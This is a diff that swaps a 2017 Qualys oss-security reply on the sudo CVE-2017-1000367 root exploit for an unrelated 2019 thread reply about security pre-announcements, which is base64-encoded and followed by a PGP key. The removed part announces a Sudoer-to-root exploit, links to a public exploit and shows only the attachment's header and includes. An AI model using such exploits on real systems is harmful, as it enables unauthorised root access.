@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5242" "Wednesday" "14" "June" "2017" "09:59:26" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20170614165926.GH8074@localhost.localdomain>" "170" "[oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's get_process_ttyname() for Linux" "^Date:" nil nil "6" "2017061416:59:26" "[oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's get_process_ttyname() for Linux" (number mark "        qsa@qualys.c Jun 14  170/5242  " thread-indent "\"[oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's get_process_ttyname() for Linux\"\n") "<20170530151629.GA19040@localhost.localdomain>" ("<20170530151629.GA19040@localhost.localdomain>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["10757" "Friday" "26" "July" "2019" "12:59:25" "+0000" "Stiepan" "stie@protonmail.ch" "<HP4s7z37GTsoDW43jgPPfFMSpfknopZFj995TBm7xpl2cc6CEmZGe6oZoXCXz81Ny11QA9ACQTGwluFzbMZyyFQv3hWuHd77hZ9VwApBptM=@protonmail.ch>" "191" "Re: [oss-security] Security release pre-announcement messages" "^Date:" nil nil "7" "2019072612:59:25" "[oss-security] Security release pre-announcement messages" (number mark "U       stie@protonm Jul 26  191/10757 " thread-indent "\"Re: [oss-security] Security release pre-announcement messages\"\n") "<20190726081640.GA4778@kroah.com>" ("<20190722100013.GJ1168@jumper.schlittermann.de>" "<20190722112146.z4ey7777h5zci2zl@local>" "<20190722112953.GT67124@symphytum.spacehopper.org>" "<20190722115009.GA4117@openwall.com>" "<110f8440-7612-6014-fd40-2f8c72097b9a@catalyst.net.nz>" "<aa6TE4xteynh2_Ca6HNTpGBRXN0UKjaeO1QKfmh9JLPDcl0GZvbZgnMqCqUIjY7tqZ7EfR1cxFot8QGtkhtBlQrlcpMdnmnCH6qxIcETRas=@protonmail.ch>" "<20190726081408.GA32730@kroah.com>" "<20190726081640.GA4778@kroah.com>") nil nil nil nil nil nil nil "Re: [oss-security] Security release pre-announcement messages" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 18257 invoked by uid 550); 14 Jun 2017 17:01:17 -0000
+Received: (qmail 21517 invoked by uid 550); 26 Jul 2019 14:00:41 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,213 +11,223 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 16369 invoked from network); 14 Jun 2017 16:59:44 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=qualys.com; s=google;
-        h=date:from:to:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to;
-        bh=6tuATNZAhUg7ZCRqT6iAca7t0T18e6ZirUaDfpzj6UQ=;
-        b=Um0hizdKe3MwbfSQP8ulQTB6ovTUCEs7NaIdWbJU7t9Dj1SqLaP54rf7t8l2m0auHZ
-         0MuyQ2IszkR53rLS6+bJmiLKyUM1M0Ve2YH/BWtlQMn5NNlca1aRt+VeJkgKhp7CO7ek
-         SqLjnXi8hVs0FrHahZyHrqYNm33GjMbQoddrItuzJJDVCYS4oCcEGP+Jjr08wX70J3jL
-         GvfSqa3c9u9eMlSMsfik5+gj0KHAhuSOUx6NQZOH3tcUyuRiKJsg+tAIuDsDSrVnw2oR
-         B2ZniDC7g+nMHiAYHhiHFHRZw7hKX8P84jo/jz4r9tWqp+BImCMOR9IJDSU6JRFieJ+w
-         eaAg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:date:from:to:subject:message-id:references
-         :mime-version:content-disposition:in-reply-to;
-        bh=6tuATNZAhUg7ZCRqT6iAca7t0T18e6ZirUaDfpzj6UQ=;
-        b=q93zhBQauAi3GiA6lyezdjx3L4ticgHOZeg0aTlJS5rDGqyu6Obmm86eSH9L5ElYGB
-         hfFR//Z65nPk3WL+ZA+5rxNo5kAuzZn3c5KwunEpKzOjMZqN/Bp6/v8nTqwylJ76CEzb
-         acWcBqHA6pz8CuNJT4V3j9nO8hBHXV3BxnZ1LptyV27belBh1YdsWYuPi6LXnVdobvnj
-         pgudkpypoeQzigY+2Tg4jiaktjPSa5XWsktnXZCq8yV8sgB8s5sniLq0t6wN6tGJwD1E
-         PaAB6KAcV/FkIVZ2JHMv+Tme1H0cjgboZA6jM+0CaewdV+GNv/0xKqIVoravFgqAwyZA
-         D5Uw==
-X-Gm-Message-State: AKS2vOy9FBO6EN/4U8UE3TDuns1RkiHpKZVeV9QaOIiPdbKn50VhHNBY
-	trTCn0u8f16RH8IfsW4=
-X-Received: by 10.84.217.216 with SMTP id d24mr1152280plj.148.1497459572090;
-        Wed, 14 Jun 2017 09:59:32 -0700 (PDT)
-Message-ID: <20170614165926.GH8074@localhost.localdomain>
-References: <20170530151629.GA19040@localhost.localdomain>
+Received: (qmail 1394 invoked from network); 26 Jul 2019 12:59:43 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.ch;
+	s=default; t=1564145971;
+	bh=IWYqPcGXJ7toK5n3adbEMVmYJEyyB5kXNxGYXk5GbDQ=;
+	h=Date:To:From:Reply-To:Subject:In-Reply-To:References:Feedback-ID:
+	 From;
+	b=OMRpLsAm+ybnz4xBYy4qsCyyMxbWMZeFu9tK+OTdesLFEjc/IVGNac68EZ+JknCRk
+	 swJ5bec49lkprBDfqk5X9/8fbhSbxlb4vVVzXKyyZHkl9LwhGuC43tkCqenUbRjATD
+	 qM5XFkrIEymvoaeYkvoxPuHRcEbr/w9ujAF3NeJ8=
+Message-ID: <HP4s7z37GTsoDW43jgPPfFMSpfknopZFj995TBm7xpl2cc6CEmZGe6oZoXCXz81Ny11QA9ACQTGwluFzbMZyyFQv3hWuHd77hZ9VwApBptM=@protonmail.ch>
+In-Reply-To: <20190726081640.GA4778@kroah.com>
+References: <20190722100013.GJ1168@jumper.schlittermann.de>
+ <20190722112146.z4ey7777h5zci2zl@local>
+ <20190722112953.GT67124@symphytum.spacehopper.org>
+ <20190722115009.GA4117@openwall.com>
+ <110f8440-7612-6014-fd40-2f8c72097b9a@catalyst.net.nz>
+ <aa6TE4xteynh2_Ca6HNTpGBRXN0UKjaeO1QKfmh9JLPDcl0GZvbZgnMqCqUIjY7tqZ7EfR1cxFot8QGtkhtBlQrlcpMdnmnCH6qxIcETRas=@protonmail.ch>
+ <20190726081408.GA32730@kroah.com>
+ <20190726081640.GA4778@kroah.com>
+Feedback-ID: wnsnnc8Us3MVqt1IALGduDJl-d16B_hEkg50pF7qo11mpeysEHmUOGy-yvw8MEApAPX3TXcPDHQwu7hti-kzSw==:Ext:ProtonMail
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="bFsKbPszpzYNtEU6"
-Content-Disposition: inline
-In-Reply-To: <20170530151629.GA19040@localhost.localdomain>
-Date: Wed, 14 Jun 2017 09:59:26 -0700
-From: Qualys Security Advisory <qsa@qualys.com>
+Content-Type: multipart/mixed;
+	boundary="b1_abeb954dd8329bd5dd9c5459767f2163"
+Date: Fri, 26 Jul 2019 12:59:25 +0000
+From: Stiepan <stie@protonmail.ch>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: Qualys Security Advisory - CVE-2017-1000367 in Sudo's
- get_process_ttyname() for Linux
+Subject: Re: [oss-security] Security release pre-announcement messages
 To: oss-security@lists.openwall.com
 
---bFsKbPszpzYNtEU6
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+--b1_abeb954dd8329bd5dd9c5459767f2163
+Content-Type: multipart/alternative;
+	boundary="b2_abeb954dd8329bd5dd9c5459767f2163"
 
-Hi all,
+--b2_abeb954dd8329bd5dd9c5459767f2163
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: base64
 
-Since a working exploit has been published already
-(https://github.com/c0d3z3r0/sudo-CVE-2017-1000367), please find our
-Sudoer-to-root exploit (Linux_sudo_CVE-2017-1000367.c) attached to this
-mail. Thank you very much!
+VGhhbmsgeW91IGZvciB0aGUgZGV0YWlscy4KCldoaWNoIGNvbG9yLCB0aGUg
+cG9ueSA/IDspCgpSZWdhcmRpbmcgdGhlIGEgYnVnIGlzIGEgYnVnIHJhdGlv
+bmFsZSB5b3UgYXJlIHJlZmVycmluZyB0bywgSSBkb24ndCBkaXNjdXNzIGl0
+IGFuZCB0aGluayB0aGF0IG11Y2ggcHJvZ3Jlc3MgaGFzIGJlZW4gbWFkZSB0
+byB0cmVhdCB0aGUgc3Vic2V0IG9mIHRob3NlIHdoaWNoIGFyZSBhbHNvIHNl
+Y3VyaXR5IGJ1Z3MsIGluY2x1ZGluZyB0aGUgZW5saWdodGVuaW5nIHBhcnRp
+Y2lwYXRpb24gb2YgTXIuIFRvcnZhbGRzIGhpbXNlbGYgdG8gdGhpcyBsaXN0
+LgpJIHdvdWxkbid0IGFkdm9jYXRlIGNoZXJyeS1waWNraW5nIGJ1Z2ZpeGVz
+IGVpdGhlciwgdGhlIEFuZHJvaWQgZXhhbXBsZXMgeW91IG1lbnRpb24gaW4g
+eW91ciByZWZlcmVuY2UgYXJlIGEgcmVhbCBuaWdodG1hcmUgaW5kZWVkLiBN
+eSBwb2ludCBpcyB0aGF0IHdlIHdvdWxkIGhhdmUgYXQgYW55IHRpbWUgdGhl
+IG1vc3Qgc2VjdXJlIGF2YWlsYWJsZSBvcHRpb24uIFRoaXMgd291bGQgaW52
+b2x2ZSBhIHN5c3RlbSB0byBzd2l0Y2ggYW1vbmcga2VybmVsIHZlcnNpb25z
+IHdoZW4gbmVlZGVkLCBlZyB3aGVuIGEgInB1cmUiIHNlY3VyaXR5IGJ1ZyB3
+aXRoIGhpZ2ggaW1wYWN0IGlzIGlkZW50aWZpZWQgYW5kIGNhbm5vdCBiZSBw
+dWJsaXNoZWQgeWV0LCBub3IgaXRzIGZpeCwgeWV0IHBlb3BsZSBjb3VsZCBz
+d2l0Y2ggbWVhbndoaWxlIHRvIGEgc2FmZXIsIGtub3duIGtlcm5lbCB2ZXJz
+aW9uLgpJIGhvcGUgdGhhdCBtYWtlcyBpdCBjbGVhcmVyLgoKQ2hlZXJzLApT
+dGllcGFuCgpFbnZvecOpIGRlcHVpcyBQcm90b25NYWlsIG1vYmlsZQoKLS0t
+LS0tLS0gTWVzc2FnZSBkJ29yaWdpbmUgLS0tLS0tLS0KT24gMjYganVpbC4g
+MjAxOSDDoCAxMDoxNiwgR3JlZyBLSCBhIMOpY3JpdCA6Cgo+IE9uIEZyaSwg
+SnVsIDI2LCAyMDE5IGF0IDEwOjE0OjA4QU0gKzAyMDAsIEdyZWcgS0ggd3Jv
+dGU6Cj4+IE9uIFRodSwgSnVsIDI1LCAyMDE5IGF0IDA5OjM1OjQ1UE0gKzAw
+MDAsIFN0aWVwYW4gd3JvdGU6Cj4+ID4gSSB3b3VsZCBsaWtlIHRvIGNvbmdy
+YXR1bGF0ZSB0aGUgdGVhbXMgdGhhdCBkbyB0aGF0LiBJZiBwdWJsaWMKPj4g
+PiBkaXNjbG9zdXJlIGlzIGRlZW1lZCB0b28gZGFuZ2Vyb3VzIGJlZm9yZSBh
+IHBhdGNoIGlzIGF2YWlsYWJsZSwgdGhpcwo+PiA+IGxvb2tzIGxpa2UgVGhl
+IHJlYXNvbmFibGUgdHJhZGVvZmYuIFdpc2ggaXQgd2FzIHRoZSBzYW1lIHdp
+dGggTGludXguLi4KPj4KPj4gSSB0b28gd2FudCBhIHBvbnkgOikKPj4KPj4g
+PiBSYXRpb25hbGU6IHBlb3BsZSBjb3VsZCBzd2l0Y2ggbWVhbndoaWxlIHRv
+IGEga25vd24gc2FmZSBrZXJuZWwuIFRoYXQKPj4gPiB3b3VsZCBwcm92aWRl
+IHBlYWNlIG9mIG1pbmQgdG8gdGhlICJyZXN0IG9mIHVzIiB3aG8gZG9uJ3Qg
+aGF2ZSB0aGUKPj4gPiBrZXlzIHRvIHRoZSBsaW51eC1kaXN0cm9zIGtpbmdk
+b20gb2YgdGhlIGVsZWN0ZWQgZmV3LCB5ZXQgd2lzaCB0byBoYXZlCj4+ID4g
+c2VjdXJlIE9TZXMsIHdpdGhvdXQgYSB3aW5kb3cgb2YgdnVsbmVyYWJpbGl0
+eSBvcGVuIHRvIHdob2V2ZXIgaGFja2VkCj4+ID4gaW50byB0aGUgZWxlY3Rl
+ZCBmZXcncyBtYWNoaW5lcyAob3IgYXJlIGVudGl0bGVkIGFub3RoZXIgd2F5
+IHRvIHRoaXMKPj4gPiBzZWNyZXQgaW5mb3JtYXRpb24pLgo+PiA+IEl0IHdv
+dWxkIGFsc28gbWFrZSBMaW51eCBnb3Zlcm5hbmNlIHdheSBtb3JlIGRlbW9j
+cmF0aWMsIHdoaWNoIHNlZW1zCj4+ID4gdG8gYmUgYSBtdXN0IGZvciBzdWNo
+IGEgInRvbyBiaWcgdG8gZmFpbCIgY29yZSBvcGVuLXNvdXJjZSBzb2Z0d2Fy
+ZS4KPj4KPj4gVGhlICJiZXN0IGtub3duIHNhZmUga2VybmVsIiBpcyB0aGUg
+bGF0ZXN0IG9uZSB3ZSByZWxlYXNlIGZyb20gdGhlCj4+IHN0YWJsZSBrZXJu
+ZWwgc2VyaWVzLiBJdCBoYXMgYWxsIG9mIHRoZSBmaXhlcyB0aGF0IHRoYXQg
+dGhlIGtlcm5lbAo+PiBkZXZlbG9wZXJzIHBvc3NpYmx5IGtub3cgYWJvdXQg
+YXQgdGhhdCBwb2ludCBpbiB0aW1lLgo+Pgo+PiBUaGVyZSdzIG5vIG5lZWQg
+dG8gd29ycnkgYWJvdXQgYmVpbmcgb24gbGludXgtZGlzdHJvcyBvciBhbnl0
+aGluZyBlbHNlLAo+PiBqdXN0IGtlZXAgdXBkYXRpbmcgeW91ciBrZXJuZWws
+IHRlc3QgaW4gaW4geW91ciBpbmZyYXN0cnVjdHVyZSB0byBlbnN1cmUKPj4g
+aXQgYWxsIHdvcmtzIHByb3Blcmx5LCBhbmQgdGhlbiBwdXNoIGl0IG91dCB0
+byBhbGwgb2YgeW91ciBvdGhlciBzeXN0ZW1zCj4+IGFuZCBhbGwgaXMgZ29v
+ZC4KPgo+IEFuZCBiZWZvcmUgYWxsIG9mIHRoZSB1c3VhbCBvYmplY3Rpb25z
+IHRha2UgcGxhY2UsIHBsZWFzZSByZWFkIHRoaXMgbG9uZwo+IHdyaXRlIHVw
+Ogo+IGh0dHA6Ly9rcm9haC5jb20vbG9nL2Jsb2cvMjAxOC8wMi8wNS9saW51
+eC1rZXJuZWwtcmVsZWFzZS1tb2RlbC8KPiBzcGVjaWZpY2FsbHkgdGhlICJT
+ZWN1cml0eSIgc2VjdGlvbiBmb3IgZGV0YWlscyBhcyB0byB3aHkgdGhlIGtl
+cm5lbAo+IGRvZXMgbm90IGRvICJwcmUtcmVsZWFzZSIgYW5ub3VuY2VtZW50
+cy4KPgo+IHRoYW5rcywKPgo+IGdyZWcgay1o
 
-With best regards,
+--b2_abeb954dd8329bd5dd9c5459767f2163
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: base64
 
--- 
-the Qualys Security Advisory team
+VGhhbmsgeW91IGZvciB0aGUgZGV0YWlscy48YnI+PGJyPldoaWNoIGNvbG9y
+LCB0aGUgcG9ueSA/IDspPGJyPjxicj5SZWdhcmRpbmcgdGhlIGEgYnVnIGlz
+IGEgYnVnIHJhdGlvbmFsZSB5b3UgYXJlIHJlZmVycmluZyB0bywgSSBkb24n
+dCBkaXNjdXNzIGl0IGFuZCB0aGluayB0aGF0IG11Y2ggcHJvZ3Jlc3MgaGFz
+IGJlZW4gbWFkZSB0byB0cmVhdCB0aGUgc3Vic2V0IG9mIHRob3NlIHdoaWNo
+IGFyZSBhbHNvIHNlY3VyaXR5IGJ1Z3MsIGluY2x1ZGluZyB0aGUgZW5saWdo
+dGVuaW5nIHBhcnRpY2lwYXRpb24gb2YgTXIuIFRvcnZhbGRzIGhpbXNlbGYg
+dG8gdGhpcyBsaXN0Ljxicj5JIHdvdWxkbid0IGFkdm9jYXRlIGNoZXJyeS1w
+aWNraW5nIGJ1Z2ZpeGVzIGVpdGhlciwgdGhlIEFuZHJvaWQgZXhhbXBsZXMg
+eW91IG1lbnRpb24gaW4geW91ciByZWZlcmVuY2UgYXJlIGEgcmVhbCBuaWdo
+dG1hcmUgaW5kZWVkLiBNeSBwb2ludCBpcyB0aGF0IHdlIHdvdWxkIGhhdmUg
+YXQgYW55IHRpbWUgdGhlIG1vc3Qgc2VjdXJlIGF2YWlsYWJsZSBvcHRpb24u
+IFRoaXMgd291bGQgaW52b2x2ZSBhIHN5c3RlbSB0byBzd2l0Y2ggYW1vbmcg
+a2VybmVsIHZlcnNpb25zIHdoZW4gbmVlZGVkLCBlZyB3aGVuIGEgInB1cmUi
+IHNlY3VyaXR5IGJ1ZyB3aXRoIGhpZ2ggaW1wYWN0IGlzIGlkZW50aWZpZWQg
+YW5kIGNhbm5vdCBiZSBwdWJsaXNoZWQgeWV0LCBub3IgaXRzIGZpeCwgeWV0
+IHBlb3BsZSBjb3VsZCBzd2l0Y2ggbWVhbndoaWxlIHRvIGEgc2FmZXIsIGtu
+b3duIGtlcm5lbCB2ZXJzaW9uLjxicj5JIGhvcGUgdGhhdCBtYWtlcyBpdCBj
+bGVhcmVyLjxicj48YnI+Q2hlZXJzLDxicj5TdGllcGFuPGJyPjxicj48YnI+
+RW52b3nDqSBkZXB1aXMgUHJvdG9uTWFpbCBtb2JpbGU8YnI+PGJyPjxicj48
+YnI+LS0tLS0tLS0gTWVzc2FnZSBkJ29yaWdpbmUgLS0tLS0tLS08YnI+T24g
+MjYganVpbC4gMjAxOSDDoCAxMDoxNiwgR3JlZyBLSCA8IGdyZWdAa3JvYWgu
+Y29tID4gYSDDqWNyaXTCoDo8YmxvY2txdW90ZSBjbGFzcz0icHJvdG9ubWFp
+bF9xdW90ZSI+PGJyPjxwIGRpcj0ibHRyIj5PbiBGcmksIEp1bCAyNiwgMjAx
+OSBhdCAxMDoxNDowOEFNICswMjAwLCBHcmVnIEtIIHdyb3RlOjxicj4NCiZn
+dDsgT24gVGh1LCBKdWwgMjUsIDIwMTkgYXQgMDk6MzU6NDVQTSArMDAwMCwg
+U3RpZXBhbiB3cm90ZTo8YnI+DQomZ3Q7ICZndDsgSSB3b3VsZCBsaWtlIHRv
+IGNvbmdyYXR1bGF0ZSB0aGUgdGVhbXMgdGhhdCBkbyB0aGF0LiBJZiBwdWJs
+aWM8YnI+DQomZ3Q7ICZndDsgZGlzY2xvc3VyZSBpcyBkZWVtZWQgdG9vIGRh
+bmdlcm91cyBiZWZvcmUgYSBwYXRjaCBpcyBhdmFpbGFibGUsIHRoaXM8YnI+
+DQomZ3Q7ICZndDsgbG9va3MgbGlrZSBUaGUgcmVhc29uYWJsZSB0cmFkZW9m
+Zi4gV2lzaCBpdCB3YXMgdGhlIHNhbWUgd2l0aCBMaW51eC4uLjxicj4NCiZn
+dDs8YnI+DQomZ3Q7IEkgdG9vIHdhbnQgYSBwb255IDopPGJyPg0KJmd0Ozxi
+cj4NCiZndDsgJmd0OyBSYXRpb25hbGU6IHBlb3BsZSBjb3VsZCBzd2l0Y2gg
+bWVhbndoaWxlIHRvIGEga25vd24gc2FmZSBrZXJuZWwuIFRoYXQ8YnI+DQom
+Z3Q7ICZndDsgd291bGQgcHJvdmlkZSBwZWFjZSBvZiBtaW5kIHRvIHRoZSAi
+cmVzdCBvZiB1cyIgd2hvIGRvbid0IGhhdmUgdGhlPGJyPg0KJmd0OyAmZ3Q7
+IGtleXMgdG8gdGhlIGxpbnV4LWRpc3Ryb3Mga2luZ2RvbSBvZiB0aGUgZWxl
+Y3RlZCBmZXcsIHlldCB3aXNoIHRvIGhhdmU8YnI+DQomZ3Q7ICZndDsgc2Vj
+dXJlIE9TZXMsIHdpdGhvdXQgYSB3aW5kb3cgb2YgdnVsbmVyYWJpbGl0eSBv
+cGVuIHRvIHdob2V2ZXIgaGFja2VkPGJyPg0KJmd0OyAmZ3Q7IGludG8gdGhl
+IGVsZWN0ZWQgZmV3J3MgbWFjaGluZXMgKG9yIGFyZSBlbnRpdGxlZCBhbm90
+aGVyIHdheSB0byB0aGlzPGJyPg0KJmd0OyAmZ3Q7IHNlY3JldCBpbmZvcm1h
+dGlvbikuPGJyPg0KJmd0OyAmZ3Q7IEl0IHdvdWxkIGFsc28gbWFrZSBMaW51
+eCBnb3Zlcm5hbmNlIHdheSBtb3JlIGRlbW9jcmF0aWMsIHdoaWNoIHNlZW1z
+PGJyPg0KJmd0OyAmZ3Q7IHRvIGJlIGEgbXVzdCBmb3Igc3VjaCBhICJ0b28g
+YmlnIHRvIGZhaWwiIGNvcmUgb3Blbi1zb3VyY2Ugc29mdHdhcmUuPGJyPg0K
+Jmd0Ozxicj4NCiZndDsgVGhlICJiZXN0IGtub3duIHNhZmUga2VybmVsIiBp
+cyB0aGUgbGF0ZXN0IG9uZSB3ZSByZWxlYXNlIGZyb20gdGhlPGJyPg0KJmd0
+OyBzdGFibGUga2VybmVsIHNlcmllcy4gSXQgaGFzIGFsbCBvZiB0aGUgZml4
+ZXMgdGhhdCB0aGF0IHRoZSBrZXJuZWw8YnI+DQomZ3Q7IGRldmVsb3BlcnMg
+cG9zc2libHkga25vdyBhYm91dCBhdCB0aGF0IHBvaW50IGluIHRpbWUuPGJy
+Pg0KJmd0Ozxicj4NCiZndDsgVGhlcmUncyBubyBuZWVkIHRvIHdvcnJ5IGFi
+b3V0IGJlaW5nIG9uIGxpbnV4LWRpc3Ryb3Mgb3IgYW55dGhpbmcgZWxzZSw8
+YnI+DQomZ3Q7IGp1c3Qga2VlcCB1cGRhdGluZyB5b3VyIGtlcm5lbCwgdGVz
+dCBpbiBpbiB5b3VyIGluZnJhc3RydWN0dXJlIHRvIGVuc3VyZTxicj4NCiZn
+dDsgaXQgYWxsIHdvcmtzIHByb3Blcmx5LCBhbmQgdGhlbiBwdXNoIGl0IG91
+dCB0byBhbGwgb2YgeW91ciBvdGhlciBzeXN0ZW1zPGJyPg0KJmd0OyBhbmQg
+YWxsIGlzIGdvb2QuPC9wPg0KPHAgZGlyPSJsdHIiPkFuZCBiZWZvcmUgYWxs
+IG9mIHRoZSB1c3VhbCBvYmplY3Rpb25zIHRha2UgcGxhY2UsIHBsZWFzZSBy
+ZWFkIHRoaXMgbG9uZzxicj4NCndyaXRlIHVwOjxicj4NCiYjOTs8YSBocmVm
+PSJodHRwOi8va3JvYWguY29tL2xvZy9ibG9nLzIwMTgvMDIvMDUvbGludXgt
+a2VybmVsLXJlbGVhc2UtbW9kZWwiPmh0dHA6Ly9rcm9haC5jb20vbG9nL2Js
+b2cvMjAxOC8wMi8wNS9saW51eC1rZXJuZWwtcmVsZWFzZS1tb2RlbDwvYT4v
+PGJyPg0Kc3BlY2lmaWNhbGx5IHRoZSAiU2VjdXJpdHkiIHNlY3Rpb24gZm9y
+IGRldGFpbHMgYXMgdG8gd2h5IHRoZSBrZXJuZWw8YnI+DQpkb2VzIG5vdCBk
+byAicHJlLXJlbGVhc2UiIGFubm91bmNlbWVudHMuPC9wPg0KPHAgZGlyPSJs
+dHIiPnRoYW5rcyw8L3A+DQo8cCBkaXI9Imx0ciI+Z3JlZyBrLWg8YnI+DQo8
+L3A+DQo8L2Rpdj4=
 
---bFsKbPszpzYNtEU6
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: attachment; filename="Linux_sudo_CVE-2017-1000367.c"
+--b2_abeb954dd8329bd5dd9c5459767f2163--
 
-/*
- * Linux_sudo_CVE-2017-1000367.c
- * Copyright (C) 2017 Qualys, Inc.
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <http://www.gnu.org/licenses/>.
- */
+--b1_abeb954dd8329bd5dd9c5459767f2163
+Content-Type: application/pgp-keys; name="publickey - stie@protonmail.ch - 0xADF18750.asc"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="publickey - stie@protonmail.ch - 0xADF18750.asc"
 
-#define _GNU_SOURCE
-#include <dirent.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <limits.h>
-#include <paths.h>
-#include <pty.h>
-#include <sched.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/inotify.h>
-#include <sys/resource.h>
-#include <sys/stat.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <unistd.h>
+LS0tLS1CRUdJTiBQR1AgUFVCTElDIEtFWSBCTE9DSy0tLS0tClZlcnNpb246
+IFBtY3J5cHRvIEdvbGFuZyAwLjAuMSAoZGRhY2ViZTApCkNvbW1lbnQ6IGh0
+dHBzOi8vcHJvdG9ubWFpbC5jb20KCnhzQk5CRmZxZEg0QkNBREQyeFhCMVFU
+UG5CMk40V3ZwZDAyWjdXbnZQSFpFTVBvRUtyNGRVOUQ4aG1LQ21JNWsKZnJH
+UktSSGpXWEVsTGcrOWdtVG5tSGVremsxbnFXKzBhbzFMbis3cmt1eXZRMkk4
+Y29aV2dOY0FCb01EUjZmbgozMmtwbE4rSGt0b1R0TW9ydXRNd0hNU3ZOcmJ0
+SHhoSGlydTFWK2hUaktpK0w0b3JJMGJmdDdWSUJFSm5KTGpOCmZ6Q0lQS09j
+WTBZZHZhSFMvSlZGclA0Qi9MSlFQNkZ6ajE3WnB3QzROK3k0TEV2SS92WmFL
+cWxocTIyVzRHOE4KNXBEUXFtbTgyMlF2N1QzSisyTTI1M09GMFc4L3h4SzZt
+T0NxYW5kUjdFMW5zS09hTmgyNW1zbHZpS0hSelRXdwoweThPYXlzYXdJYkxQ
+TTk2ZGlrdWtyTmlNeSt1bEU5djJjMkZBQkVCQUFITkozTjBhV1ZBY0hKdmRH
+OXViV0ZwCmJDNWphQ0E4YzNScFpVQndjbTkwYjI1dFlXbHNMbU5vUHNMQWRR
+UVFBUWdBS1FVQ1dOL3Bld1lMQ1FjSUF3SUoKRUQ4U0RmL21wS0F2QkJVSUNn
+SURGZ0lCQWhrQkFoc0RBaDRCQUFBbFl3Z0FvTDRsZ2pmNFQwZ1ordUhRUVR6
+SwpNM0l2ck12M1dmZFFpbUtxbmhOM0syTWhFTTROWmNPSXFjSkFDS3lwcHlh
+RkJNVkVYSm9EckZVanZ3bCtZemQyClViaDJDUThiUEdTVzRtczJNY0kyT2ZH
+V1c0UzMyOVRxRnRGQWVHS0J3eERWMHJzZTl6YmNTQ3lGRHBEbmx5Qk4KSjJi
+SGdiaUh0TVpUTkZRbHlUYmo5NzNHek8zdjZlT20zQmplT2lZZ0ZnRUlPWFkw
+Y0xjMWlEVmNraFQ4aEpvVwp2VHR0SVVXajJyc0VManFYTlhJeGk4eHJDejB6
+RFJYWUxLZFJFWTVKbE4vWHB3UE1FbkhmS2VQV0pNdlFNN1pnClBjQmt5SzNE
+N2lBNmJuZ2kzamI1OElmWW9UN2pqbndjdHJ2cDl5aWU1bjJ1b3FFSkh0S29x
+Wkp3dEowOFUzajMKT3M3QVRRUlg2blIrQVFnQXAxczRqc1lGRjdUOHZWUEZu
+OWVGMmVyNzJhWmdYMTMxUjJHV2VtSnhONEwrLzNzeAp0VVZPL2dCSDY0L2Jz
+VUZLM1ZQK0F2N2MvYnpzamhtdkFhTHYvbGF0dDVnZFNGOTBtMjNJbWlNK3pC
+aWxFbHFiCm5PT1BxaTBNeTVWYVhoQXdFR0FOdmppcVhwaW4wV0tydlRXWnY0
+bEV0SUY5cGtRYjMwT0g1WXo2RXhrQS9ZcXEKWFNvTEhjNllLZFpJVUpRVGdq
+cHF4U0M3RTNRdm5MTDhWR1Z4dFJvWXAxQ242ZngzYjQwc3VwVXhJTXNpWVFl
+MgpzNWVRbFBnUVhVbTlHQk52bXlNMHVCcUtoeWxwMU94VFQ0aHcraUR1SkRL
+UjhSVTVLcFo1UDQ5NjJMYWZEMVRVClZDRWNrVzI5aU5ZRlpiaTI3SlM2a2hL
+OHZJRGZSMkpHZVJ6M3FRQVJBUUFCd3NCZkJCZ0JDQUFUQlFKWTMrbDcKQ1JB
+L0VnMy81cVNnTHdJYkRBQUFrdUFILzFlbGlyQXRMTit4YWJGYVA5NkRjeUZ5
+eTdvWmZHWjRWV2dqOVErbgpnOXdIcWpZNVU0Um1UVitKbjViWGNYRkJzYUxK
+VTl4NmZ3NUpPdWNtU2VtWUtSenBwK21YcElrazFsNk02Z3lVCjc2TWxybklq
+NGJrdnFBcERNNFJJY0hNUHVpK2t1SlcvQVo5S2RrcStYN0hHR3hLWWNMQk5w
+V2tOL2F1MTllV2EKbnlKNDc5NkkvV1h4YjNDV1JHTk83WlQ2Zll3d0ZVWWFq
